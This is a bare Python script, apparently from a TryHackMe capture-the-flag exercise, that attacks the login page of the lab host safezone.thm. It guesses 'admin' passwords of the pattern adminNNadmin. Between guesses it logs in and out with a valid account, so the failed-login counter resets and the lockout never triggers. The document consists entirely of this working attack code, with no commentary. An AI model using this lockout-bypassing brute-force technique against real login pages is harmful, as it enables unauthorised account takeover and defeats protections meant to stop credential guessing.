import requests

def valid_login(sess):
	sess.post('http://safezone.thm/index.php', data={
		'username': 'user',
		'password': 'password',
		'submit': 'Submit'
	})

	sess.get('http://safezone.thm/logout.php')


def try_comb(sess, user='koko', passwd='koko'):
	resp = sess.post('http://safezone.thm/index.php', data={
		'username': user,
		'password': passwd,
		'submit': 'Submit'
	}).content.decode()

	return 'window.location.href' in resp


s = requests.Session()

trying = 0

while trying < 100:
	passwd = f"admin{trying:02d}admin"

	print(f"Trying password : {passwd}")

	is_valid = try_comb(s, user='admin', passwd=passwd)

	if is_valid:
		print(f"\nFound valid password : {passwd}")
		break

	# Reset login attemps
	valid_login(s)

	trying += 1

print("Done")